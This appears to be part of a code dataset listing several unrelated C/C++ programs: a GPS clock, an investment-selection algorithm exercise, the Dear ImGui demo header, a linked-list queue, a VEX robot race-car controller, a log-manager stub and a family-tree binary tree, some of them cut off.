else if (ms < 100) {\n    millisecond_str = \"00\" + millisecond_str;\n  }\n\n  String data = hour_str + \":\" + minute_str + \":\" + second_str + \":\" + millisecond_str;\n\n  myDisplay.print(data);  // Update the display with the relevant information.\n}\n\nvoid getTime() {\n  bool completed = false;\n\n  myDisplay.displayClear();\n  myDisplay.setTextAlignment(PA_CENTER);\n  myDisplay.print(\"Finding Sats.\");\n\n  while (!completed) {\n    while (SoftSerial.available() > 0) {\n      if (gps.encode(SoftSerial.read())) {\n\n        // get time from GPS module\n        if (gps.time.isValid()) {\n          Minute = gps.time.minute();\n          Second = gps.time.second();\n          Hour = gps.time.hour();\n        }\n\n        // set currentMillis UTC time\n        setTime(Hour, Minute, Second, Day, Month, Year);\n\n        // add the offset to get local time\n        adjustTime(time_offset);\n\n        // update time array\n        Time[12] = second() / 10 + '0';\n        Time[13] = second() % 10 + '0';\n        Time[9] = minute() / 10 + '0';\n        Time",
    "/*\n424\u3001\u865a\u62df\u6e38\u620f\u7406\u8d22 / \u6700\u4f18\u6295\u8d44\u65b9\u5f0f\n\u9898\u76ee\u63cf\u8ff0\uff1a\n\u5728\u4e00\u6b3e\u865a\u62df\u6e38\u620f\u4e2d\u751f\u6d3b\uff0c\u4f60\u5fc5\u987b\u8fdb\u884c\u6295\u8d44\u4ee5\u589e\u5f3a\u5728\u865a\u62df\u6e38\u620f\u4e2d\u7684\u8d44\u4ea7\u4ee5\u514d\u88ab\u6dd8\u6c70\u51fa\u5c40\u3002\u73b0\u6709\u4e00\u5bb6Bank\uff0c\u5b83\u63d0\u4f9b\u6709\u82e5\u5e72\u7406\u8d22\u4ea7\u54c1m\uff0c\u98ce\u9669\u53ca\u6295\u8d44\u56de\u62a5\u4e0d\u540c\uff0c\u4f60\u6709N\uff08\u5143\uff09\u8fdb\u884c\u6295\u8d44\uff0c\u80fd\u63a5\u53d7\u7684\u603b\u98ce\u9669\u503c\u4e3aX\u3002\n\u4f60\u8981\u5728\u53ef\u63a5\u53d7\u8303\u56f4\u5185\u9009\u62e9\u6700\u4f18\u7684\u6295\u8d44\u65b9\u5f0f\u83b7\u5f97\u6700\u5927\u56de\u62a5\u3002\n\u8bf4\u660e\uff1a\n\u5728\u865a\u62df\u6e38\u620f\u4e2d\uff0c\u6bcf\u9879\u6295\u8d44\u98ce\u9669\u503c\u76f8\u52a0\u4e3a\u603b\u98ce\u9669\u503c\uff1b\n\u5728\u865a\u62df\u6e38\u620f\u4e2d\uff0c\u6700\u591a\u53ea\u80fd\u6295\u8d442\u4e2a\u7406\u8d22\u4ea7\u54c1\uff1b\n\u5728\u865a\u62df\u6e38\u620f\u4e2d\uff0c\u6700\u5c0f\u5355\u4f4d\u4e3a\u6574\u6570\uff0c\u4e0d\u80fd\u62c6\u5206\u4e3a\u5c0f\u6570\uff1b\n\u6295\u8d44\u989d*\u56de\u62a5\u7387=\u6295\u8d44\u56de\u62a5\n\n\u8f93\u5165\u63cf\u8ff0\uff1a\n\u7b2c\u4e00\u884c\uff1a\u4ea7\u54c1\u6570(\u53d6\u503c\u8303\u56f4[1, 20])\uff0c\u603b\u6295\u8d44\u989d(\u6574\u6570\uff0c\u53d6\u503c\u8303\u56f4[1, 10000])\uff0c\u53ef\u63a5\u53d7\u7684\u603b\u98ce\u9669(\u6574\u6570\uff0c\u53d6\u503c\u8303\u56f4[1, 200])\n\u7b2c\u4e8c\u884c\uff1a\u4ea7\u54c1\u6295\u8d44\u56de\u62a5\u7387\u5e8f\u5217\uff0c\u8f93\u5165\u4e3a\u6574\u6570\uff0c\u53d6\u503c\u8303\u56f4[1,60]\n\u7b2c\u4e09\u884c\uff1a\u4ea7\u54c1\u98ce\u9669\u503c\u5e8f\u5217\uff0c\u8f93\u5165\u4e3a\u6574\u6570\uff0c\u53d6\u503c\u8303\u56f4[1,100]\n\u7b2c\u56db\u884c\uff1a\u6700\u5927\u6295\u8d44\u989d\u5ea6\u5e8f\u5217\uff0c\u8f93\u5165\u4e3a\u6574\u6570\uff0c\u53d6\u503c\u8303\u56f4[1,10000]\n\n\u8f93\u51fa\u63cf\u8ff0\uff1a\n\u6bcf\u4e2a\u4ea7\u54c1\u7684\u6295\u8d44\u989d\u5e8f\u5217\n\u8865\u5145\u8bf4\u660e\uff1a\n\u5728\u865a\u62df\u6e38\u620f\u4e2d\uff0c\u6bcf\u9879\u6295\u8d44\u98ce\u9669\u503c\u76f8\u52a0\u4e3a\u603b\u98ce\u9669\u503c\uff1b\n\u5728\u865a\u62df\u6e38\u620f\u4e2d\uff0c\u6700\u591a\u53ea\u80fd\u6295\u8d442\u4e2a\u7406\u8d22\u4ea7\u54c1\uff1b\n\u5728\u865a\u62df\u6e38\u620f\u4e2d\uff0c\u6700\u5c0f\u5355\u4f4d\u4e3a\u6574\u6570\uff0c\u4e0d\u80fd\u62c6\u5206\u4e3a\u5c0f\u6570\uff1b\n\u6295\u8d44\u989d*\u56de\u62a5\u7387=\u6295\u8d44\u56de\u62a5\n\n\u6536\u8d77\n\u793a\u4f8b1\n\u8f93\u5165\uff1a\n5 100 10\n10 20 30 40 50\n3 4 5 6 10\n20 30 20 40 30\n\u8f93\u51fa\uff1a\n0 30 0 40 0\n\u8bf4\u660e\uff1a\n\u6295\u8d44\u7b2c\u4e8c\u987930\u4e2a\u5355\u4f4d\uff0c\u7b2c\u56db\u987940\u4e2a\u5355\u4f4d\uff0c\u603b\u7684\u6295\u8d44\u98ce\u9669\u4e3a\u4e24\u9879\u76f8\u52a0\u4e3a4+6=10\n\n\u7ea6\u675f\uff1a\n1. \u98ce\u9669\u603b\u548c\u4e0d\u8d85\u8fc7\u98ce\u9669\n2. \u83b7\u5f97\u6700\u5927\u6295\u8d44\u56de\u62a5\n3. \u6700\u591a\u4e24\u9879\n\n\u601d\u8def\uff1a\u66b4\u529b\u679a\u4e3e\n\u4e00\u5f00\u59cb\u770b\u9898\u76ee\u8fd8\u4ee5\u4e3a\u662f\u4e00\u9053\u4e8c\u7ef4\u80cc\u5305DP\uff0c\u4f46\u662f\u9898\u76ee\u52a0\u4e86\u4e00\u4e2a\u9650\u5236\u6761\u4ef6\uff1a\u6700\u591a\u53ea\u80fd\u6295\u8d44\u4e24\u4e2a\u7406\u8d22\u4ea7\u54c1\uff0c\u90a3\u4e48\u8981\u4e48\u5c31\u662f\u6295\u8d44\u4e00\u4e2a\uff0c\u8981\u4e48\u5c31\u662f\u6295\u8d44\u4e24\u4e2a\uff0c\u5c31\u5206\u522b\u679a\u4e3e\u8fd9\u4e24\u79cd\u60c5\u51b5\uff0c\u66f4\u65b0\u6700\u5927\u56de\u62a5\u5373\u53ef\u3002\n*/\n#include<iostream>\n#include<vector>\n#include<algorithm>\n#include<map>\n\nusing namespace std;\n\nint main()\n{\n\t// \u8f93\u5165\u6570\u636e\n\tint m, n, x; // \u4ea7\u54c1\u6570 \u6295\u8d44\u989d \u603b\u98ce\u9669\n\tcin >> m >> n >> x;\n\tvector<int> return_invest(m);\t// \u4ea7\u54c1\u6295\u8d44\u56de\u62a5\u7387\n\tvector<int> risk(m);\t\t\t// \u4ea7\u54c1\u98ce\u9669\u503c\n\tvector<int> limit_invest(m);\t// \u6700\u5927\u6295\u8d44\u989d\u5ea6\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tcin >> return_invest[i];\n\t}\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tcin >> risk[i];\n\t}\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tcin >> limit_invest[i];\n\t}\n\tmap<int, int> choose; // \u6700\u7ec8\u6295\u8d44\u5e8f\u5217\u548c\u989d\u5ea6\n\tint max_return = 0; // \u6700\u5927\u6295\u8d44\u989d\n\t// \u8ba1\u7b97\n\t// \u6295\u8d44\u5355\u4e2a\u9879\u76ee\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tif (risk[i] <= x)\n\t\t{\n\t\t\tint investI = min(limit_invest[i], n);\t// \u6295\u8d44\u7684\u989d\u5ea6\u4e0d\u8d85\u8fc7 \u6295\u8d44\u989d \u548c \u6700\u5927\u6295\u8d44\u989d\u5ea6\n\t\t\tif (investI * return_invest[i] > max_return)\n\t\t\t{\n\t\t\t\tmax_return = investI * return_invest[i];\n\t\t\t\tchoose = {pair<int, int>(i, investI)};\n\t\t\t}\n\t\t}\n\t}\n\t// \u6295\u8d44\u4e24\u4e2a\u9879\u76ee\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tfor (int j = 0; j < m; j++)\n\t\t{\n\t\t\tif (risk[i] + risk[j] <= x) // \u6ee1\u8db3\u98ce\u9669\n\t\t\t{\n\t\t\t\tint investI, investII;\t// i \u548c j \u7684\u6295\u8d44\u989d\n\t\t\t\tif (return_invest[i] > return_invest[j])\n\t\t\t\t{\n\t\t\t\t\tinvestI = min(limit_invest[i], n);\n\t\t\t\t\tinvestII = min(limit_invest[j], n - investI);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tinvestII = min(limit_invest[j], n);\n\t\t\t\t\tinvestI = min(limit_invest[i], n - investII);\n\t\t\t\t}\n\t\t\t\tif (investI * return_invest[i] + investII * return_invest[j] > max_return)\n\t\t\t\t{\n\t\t\t\t\tmax_return = investI * return_invest[i] + investII * return_invest[j];\n\t\t\t\t\tchoose = { pair<int, int>(i, investI), pair<int, int>(j, investII) };\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\t// \u8f93\u51fa\u7ed3\u679c\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tcout << choose[i] << \" \";\n\t}\n}",
    "// dear imgui, v1.79 WIP\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for more details, documentation and comments.\n// Get latest version at https://github.com/ocornut/imgui\n\n// Message to the person tempted to delete this file when integrating Dear ImGui into their code base:\n// Do NOT remove this file from your project! Think again! It is the most useful reference code that you and other\n// coders will want to refer to and call. Have the ImGui::ShowDemoWindow() function wired in an always-available\n// debug menu of your game/app! Removing this file from your project is hindering access to documentation for everyone\n// in your team, likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In other situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n// Message to beginner C/C++ programmers about the meaning of the 'static' keyword:\n// In this demo code, we frequently we use 'static' variables inside functions. A static variable persist across calls,\n// so it is essentially like a global variable but declared inside the scope of the function. We do this as a way to\n// gather code and data in the same place, to make the demo source code faster to read, faster to write, and smaller\n// in size. It also happens to be a convenient way of storing simple UI related information as long as your function\n// doesn't need to be reentrant or used in multiple threads. This might be a pattern you will want to use in your code,\n// but most of the real data you would be editing is likely going to be stored outside your functions.\n\n// The Demo code in this file is designed to be easy to copy-and-paste in into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui_internal.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations, Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Example App: Constrained Resize / ShowExampleAppConstrainedResize()\n// [SECTION] Example App: Simple Overlay / ShowExampleAppSimpleOverlay()\n// [SECTION] Example App: Manipulating Window Titles / ShowExampleAppWindowTitles()\n// [SECTION] Example App: Custom Rendering using ImDrawList API / ShowExampleAppCustomRendering()\n// [SECTION] Example App: Documents Handling / ShowExampleAppDocuments()\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n\n#include <ctype.h>          // toupper\n#include <limits.h>         // INT_MIN, INT_MAX\n#include <math.h>           // sqrtf, powf, cosf, sinf, floorf, ceilf\n#include <stdio.h>          // vsnprintf, sscanf, printf\n#include <stdlib.h>         // NULL, malloc, free, atoi\n#if defined(_MSC_VER) && _MSC_VER <= 1500 // MSVC 2008 or earlier\n#include <stddef.h>         // intptr_t\n#else\n#include <stdint.h>         // intptr_t\n#endif\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4996) // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#endif\n\n// ",
    "#include <iostream>\nusing namespace std;\nstruct node\n{\n\tint Data;\n\tnode* next;\n};\n\nnode* current = NULL;\nnode* Front = NULL;\nnode* Rear = NULL;\n\nvoid enqueue(int newdata)\n{\n\tnode* current = new node();\n\tcurrent->Data = newdata;\n\tif (Rear != NULL)\n\t{\n\t\tRear->next = current;\n\t\tRear = current;\n\t}\n\telse\n\t{\n\t\tFront = current;\n\t\tRear = current;\n\t}\n\tRear->next = NULL;\n}\nvoid dequeue()\n{\n\tif (Front != NULL)\n\t{\n\t\tcurrent = Front;\n\t\tFront = Front->next;\n\t\tdelete current;\n\t}\n\telse { cout << \"No element Found to be dequeued\" << endl; }\n}\nvoid dequeueAll()\n{\n\twhile (Front != NULL)\n\t{\n\t\tcurrent = Front;\n\t\tFront = Front->next;\n\t\tdelete current;\n\t}\n\tRear = Front = NULL;\n}\nvoid display()\n{\n\tif (Front != NULL)\n\t{\n\t\tcurrent = Front;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->Data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse { cout << \"There is no data in the queue\\n\"; }\n}\nvoid app()\n{\n\t/*\n\t\top -> operation\n\t\tc -> confirm\n\t\te -> enqueue node\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\tint op, c, e, ao, s;\n\tcout << \"--- Welcome to queue implementation---\\n\";\n\tdo\n\t{\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << \"Enqueue -> (1)\\n\";\n\t\tcout << \"Dequeue an Elements -> (2) \\n\";\n\t\tcout << \"Dequeue All Elements -> (3)\\n\";\n\t\tcout << \"Display -> (4)\\n\";\n\t\tcout << \"Exit -> (5)\\n\";\n\t\tcin >> op;\n\t\tswitch (op)\n\t\t{\n\t\tcase 1:\n\t\t\tcout << \"Enter value do you want to enqueue\\n\";\n\t\t\tcin >> e;\n\t\t\tenqueue(e);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tcout << \"Are you sure to dequeue one node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdequeue();\n\t\t\t\tcout << \"\\nCheck data of queue after dequeuing first node :\\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Dequeue is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tcout << \"Are you sure to dequeue all nodes\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdequeueAll();\n\t\t\t\tcout << \"\\nCheck data of queue after dequeuing all nodes :\\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Dequeue all is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tcout << \"Enqueue Elements are:\\n\";\n\t\t\tdisplay();\n\t\t\tbreak;\n\t\tcase 5:\n\t\t\treturn;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tcout << \"Wrong Input Try Again\\n\";\n\t\t}\n\t\tcout << \"Do you want another opration\\n\";\n\t\tcout << \"Yes -> 1 \\n\";\n\t\tcout << \"NO -> any key \\n\";\n\t\tcin >> ao;\n\t} while (ao == 1);\n}\nint main()\n{\n\tapp();\n\treturn 0;\n}",
    "\n#pragma region VEXcode Generated Robot Configuration\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <math.h>\n#include <string.h>\n\n#include \"vex.h\"\n\nusing namespace vex;\n\nbrain Brain;\n\n// robot devices onfiguration\nmotor backLeft = motor(PORT1, ratio36_1, false);\nmotor backRight = motor(PORT2, ratio36_1, true);\n\ninertial mpu = inertial(PORT6);\n\ndistance distanceLeft = distance(PORT11);\ndistance distanceRight = distance(PORT12);\ndistance distanceFront = distance(PORT13);\n\noptical colorLeft = optical(PORT16);\noptical colorRight = optical(PORT17);\n\ncontroller Controller1 = controller(primary);\n\nbool RemoteControlCodeEnabled = true;\n\n#pragma endregion VEXcode Generated Robot Configuration\n\n/*----------------------------------------------------------*/\n/*                                                          */\n/*    Module:       main.cpp                                */\n/*    Author:       Jining Liu                              */\n/*    Created:      04/26/2024                              */\n/*    Description:  Autonomous Race Car for POE             */\n/*                                                          */\n/*----------------------------------------------------------*/\n\n#include \"vex.h\"\n\nusing namespace vex;\n\n// decides which distance sensor to use\nbool useRightSensor = true;\n\n// decides distance between car and wall in mm, this is a range\nconst int minDistanceFromWall = 250, maxDistanceFromWall = 350;\n\n// decides the intensity of system keep straight adjustments\nconst double leftPidMultiplier = 1, rightPidMultiplier = 2;\n\n// decides initial speed of back motors\nconst int initLeftMotor = 34, initRightMotor = 50;\nconst int leftMotorMin = 31, rightMotorMin = 44;\nconst int leftMotorMax = 37, rightMotorMax = 56;\nint leftMotor = initLeftMotor, rightMotor = initRightMotor;\n\n// DO NOT CHANGE: stores distance sensor data, default 0\nint lastLeft, currentLeft, lastRight, currentRight, currentFront;\n\n// DO NOT CHANGE: stopwatch for race timing in ms, default 0\nint raceTime;\n\n// required to predefine functions??? vex version of cpp is dumb... declarations down below\nvoid updateDistance();\nvoid pidDistanceStraight();\nvoid executeTurn(int i, int delay);\nvoid finalLeg();\nvoid abort();\nvoid pauseResume();\nvoid stop();\nvoid debugPrint();\nvoid preparePrintBig(int y, int x, bool clear);\n\n// auton turns programming\n// timing is automatic\n//\n// make sure numberOfTurns is the same as the length of carTurns & preTurnDelay!\n// memory allocation is required!!!\n//\n// key:\n// -1 - left turn\n// 0 - keep straight\n// 1 - right turn\nconst int numberOfTurns = 6;\nconst int carTurns[numberOfTurns] = {0, 1, 0, 1, 1, -1};\n// this sets the seconds of delay BEFORE executing the turn or continuing on\nconst int preTurnDelay[numberOfTurns] = {3, 1, 2, 1, 1, 1};\n// this sets the seconds of delay AFTER executing the turn or continuing on\nconst int postTurnDelay[numberOfTurns] = {0, 2, 0, 2, 2, 2};\n\n// stupid vex don't ask\nbool overrideFirst9999 = true;\n\nbool paused = false;\nbool aborted = false;\n\nint main()\n{\n\n  preparePrintBig(2, 1, true);\n  Brain.Screen.print(\"Initializing...\");\n\n  Controller1.ButtonX.pressed(abort);\n  Controller1.ButtonR1.pressed(pauseResume);\n\n  // super inertial sensor calibration\n  for (int i = 0; i < 100; i++)\n  {\n    mpu.calibrate();\n    mpu.setHeading(0, degrees);\n    wait(15, msec);\n  }\n\n  wait(1, seconds);\n\n  preparePrintBig(2, 1, true);\n  Brain.Screen.print(\"Currently:\");\n\n  // record start time\n  raceTime = Brain.Timer.time(msec);\n\n  for (int i = 0; i < numberOfTurns; i++)\n  {\n\n    stop();\n\n    mpu.setHeading(0, degrees);\n\n    preparePrintBig(3, 1, false);\n    Brain.Screen.clearLine(3);\n    Brain.Screen.print(\"Straightaway\");\n    preparePrintBig(3, 14, false);\n    Brain.Screen.print(i + 1);\n    Brain.Screen.clearLine(4);\n\n    // if car is detecting wall where it's supposed to be, always loop pid\n    while ((useRightSensor && !(currentRight >= 9999 && lastRight < 9999)) ||\n           (!useRightSensor && !(currentRight >= 9999 && lastLeft < 9999)))\n    {\n      stop();\n      pidDistanceStraight();\n      wait(100, msec);\n    }\n\n    preparePrintBig(3, 1, false);\n    Brain.Screen.clearLine(3);\n    Brain.Screen.print(\"Intersection\");\n    preparePrintBig(3, 14, false);\n    Brain.Screen.print(i + 1);\n    preparePrintBig(4, 1, false);\n    switch (carTurns[i])\n    {\n    case -1:\n      Brain.Screen.print(\"Left Turn\");\n      break;\n    case 0:\n      Brain.Screen.print(\"Keep Straight\");\n      break;\n    case 1:\n      Brain.Screen.print(\"Right Turn\");\n      break;\n    }\n\n    // keep going delay before turn\n    wait(preTurnDelay[i], seconds);\n\n    executeTurn(carTurns[i], postTurnDelay[i]);\n  }\n\n  preparePrintBig(3, 1, false);\n  Brain.Screen.clearLine(3);\n  Brain.Screen.print(\"Final Leg!\");\n\n  finalLeg();\n}\n\n// predefine for all below, this is so dumb\nvoid setVelocity();\n\n// predefine for pid, this is so dumb\nvoid pidShiftLeft();\nvoid pidShiftRight();\n\n// pid for back motors keeping straight and correc",
    "#include \"log_manager.h\"\n\n#include <sstream>\n\n/**\n * \u5f00\u542f\u65e5\u5fd7\u5237\u65b0\u7ebf\u7a0b\n */\nvoid LogManager::RunFlushThread() {\n    // Todo:\n    // 1. \u5982\u679c\u7cfb\u7edf\u672a\u5f00\u542f\u65e5\u5fd7\u529f\u80fd\uff0c\u5219\u4e0d\u80fd\u5f00\u542f\u65e5\u5fd7\u5237\u65b0\u7ebf\u7a0b\uff08\u901a\u8fc7log_mode_\u5224\u65ad\uff09\n    // 2. \u5f00\u542f\u4e00\u4e2a\u65b0\u7ebf\u7a0b\uff0c\u7528\u6765\u628aflush_buffer_\u4e2d\u7684\u5185\u5bb9\u5237\u65b0\u5230\u78c1\u76d8\u5f53\u4e2d\n    // 3. \u5728\u5237\u65b0\u4e4b\u524d\uff0c\u9700\u8981\u5224\u65ad\u5f53\u524d\u7ebf\u7a0b\u7531\u4e8e\u54ea\u79cd\u539f\u56e0\u88ab\u5524\u9192\uff0c\u5982\u679c\u662ftime_out\u5524\u9192\uff0c\u5219\u9700\u8981\u4ea4\u6362log_buffer\u548cflush_buffer\n    // 4.  \u5237\u65b0\u4e4b\u540e\u9700\u8981\u66f4\u65b0flush_buffer\u7684\u504f\u79fb\u91cf\u3001persistent_lsn_\u7b49\u4fe1\u606f\n\n}\n\n/**\n * \u8f85\u52a9\u51fd\u6570\uff0c\u7528\u4e8eDiskManager\u5524\u9192flush_thread_\n * @param p\n */\nvoid LogManager::WakeUpFlushThread(std::promise<void> *p) {\n    {\n        std::unique_lock<std::mutex> lock(latch_);\n        SwapBuffer();\n        SetPromise(p);\n    }\n\n    cv_.notify_one();\n\n    // waiting for flush_done\n    if (promise != nullptr) {\n        promise->get_future().wait();\n    }\n\n    SetPromise(nullptr);\n}\n\n/**\n * \u8f85\u52a9\u51fd\u6570\uff0c\u4ea4\u6362log_buffer_\u548cflush_buffer_\u53ca\u5176\u76f8\u5173\u4fe1\u606f\n */\nvoid LogManager::SwapBuffer() {\n    std::swap(log_buffer_, flush_buffer_);\n    std::swap(log_buffer_write_offset_, flush_buffer_write_offset_);\n    flush_lsn_ = next_lsn_ - 1;\n}\n\n/**\n * \u6dfb\u52a0\u4e00\u6761\u65e5\u5fd7\u8bb0\u5f55\u5230log_buffer_\u4e2d\n * @param log_record \u8981\u6dfb\u52a0\u7684\u65e5\u5fd7\u8bb0\u5f55\n * @return \u8fd4\u56de\u8be5\u65e5\u5fd7\u7684\u65e5\u5fd7\u5e8f\u5217\u53f7\n */\nlsn_t LogManager::AppendLogRecord(LogRecord *log_record) {\n    // Todo:\n    // 1. \u83b7\u53d6\u4e92\u65a5\u9501latch_\n    // 2. \u5224\u65adlog_buffer_\u4e2d\u662f\u5426\u8fd8\u5b58\u5728\u8db3\u591f\u7684\u5269\u4f59\u7a7a\u95f4\uff0c\u5982\u679c\u7a7a\u95f4\u4e0d\u8db3\uff0c\u9700\u8981\u4ea4\u6362log_buffer_\u548cflush_buffer_\uff0c\u5524\u9192\u65e5\u5fd7\u5237\u65b0\u7ebf\u7a0b\n    // 3. \u4e3a\u8be5\u65e5\u5fd7\u5206\u914d\u65e5\u5fd7\u5e8f\u5217\u53f7\n    // 4. \u628a\u8be5\u65e5\u5fd7\u5199\u5165\u5230log_buffer_\u4e2d\n\n    return log_record->lsn_;\n}",
    "#include <iostream>\nusing namespace std;\nstruct tree\n{\n    tree *left;\n    tree *right;\n    string name, relation;\n    int age;\n};\ntree *create_node()\n{\n    tree *temp, *root;\n    temp = new tree;\n    temp->left = NULL;\n    temp->right = NULL;\n    cout << \"Enter name \" << endl;\n    cin >> temp->name;\n    cout << \"enter relation\" << endl;\n    cin >> temp->relation;\n    cout << \"enter age\";\n    cin >> temp->age;\n    return temp;\n}\ntree *create()\n{\n    tree *temp, *root, *ptr;\n    int ch;\n    root = NULL;\n\n    int dir;\n    do\n    {\n        ptr = create_node();\n\n        if (root == NULL)\n        {\n            root = ptr;\n        }\n        else\n        {\n            temp = root;\n            while (temp != NULL)\n            {\n                cout << \"Which direction you want to add(left=2/right=3)\" << endl;\n                cin >> dir;\n                if (dir == 2)\n                {\n                    if (temp->left == NULL)\n                    {\n                        temp->left = ptr;\n                        break;\n                    }\n                    else\n                    {\n                        temp = temp->left;\n                    }\n                }\n                else\n                {\n                    if (temp->right == NULL)\n                    {\n                        temp->right = ptr;\n                        break;\n                    }\n                    else\n                    {\n                        temp = temp->left;\n                    }\n                }\n            }\n        }\n        cout << \"you want to continue(1/0)\";\n        cin >> ch;\n    } while (ch == 1);\n    return (root);\n}\nvoid inorder_dis(tree *h)\n{\n    if (h == NULL)\n    {\n        return;\n    }\n    else\n    {\n\n        inorder_dis(h->left);\n        cout << h->name << endl;\n        cout << h->relation << endl;\n        cout << h->age << endl;\n        inorder_dis(h->right);\n    }\n}\nvoid preorder_dis(tree *h)\n{\n    if (h == NULL)\n    {\n        return;\n    }\n    else\n    {\n\n        cout << h->name << endl;\n        cout << h->relation << endl;\n        cout << h->age << endl;\n        preorder_dis(h->left);\n        preorder_dis(h->right);\n    }\n}\nvoid postorder_dis(tree *h)\n{\n    if (h == NULL)\n    {\n        return;\n    }\n    else\n    {\n\n        postorder_dis(h->left);\n\n        postorder_dis(h->right);\n        cout << h->name << endl;\n        cout << h->relation << endl;\n        cout << h->age << endl;\n    }\n}\ntree *insert()\n{\n    tree *temp, *root, *ptr;\n    int ch;\n    root = NULL;\n\n    int dir;\n    do\n    {\n        ptr = create_node();\n\n        if (root == NULL)\n        {\n            root = ptr;\n        }\n        else\n        {\n            temp = root;\n            while (temp != NULL)\n            {\n                cout << \"Which direction you want to add(left=2/right=3)\" << endl;\n                cin >> dir;\n                if (dir == 2)\n                {\n                    if (temp->left == NULL)\n                    {\n                        temp->left = ptr;\n                        break;\n                    }\n                    else\n                    {\n                        temp = temp->left;\n                    }\n                }\n                else\n                {\n                    if (temp->right == NULL)\n                    {\n                        temp->right = ptr;\n                        break;\n                    }\n                    else\n                    {\n                        temp = temp->left;\n                    }\n                }\n            }\n        }\n        cout << \"you want to continue(1/0)\";\n        cin >> ch;\n    } while (ch == 1);\n    return (root);\n}\nint main()\n{\n    tree *h;\n    h = create();\n    int ch, che;\n    do\n    {\n        cout << \"1.Preorder Display \\n 2.Inorder Display \\n 3.Postorder Display \\n4.Insert\" << endl;\n        cout << \"enter Your choice\" << endl;\n        cin >> ch;\n        switch (ch)\n        {\n        case 1:\n            cout << \"----------------------------------------------\" << endl;\n            cout << \"Preorder Traversal\" << endl;\n            preorder_dis(h);\n\n            break;\n        case 2:\n            cout << \"----------------------------------------------\" << endl;\n            cout << \"Inorder Traversal\" << endl;\n            inorder_dis(h);\n\n            break;\n        case 3:\n            cout << \"----------------------------------------------\" << endl;\n            cout << \"postorder Traversal\" << endl;\n            postorder_dis(h);\n            break;\n            case 4:\n            insert(h);\n            break;\n        }\n        cout << \"You  Want to continue(1/0)\" << endl;\n        cin >> che;\n    } while (che == 1);\n\n    return 0;\n}",
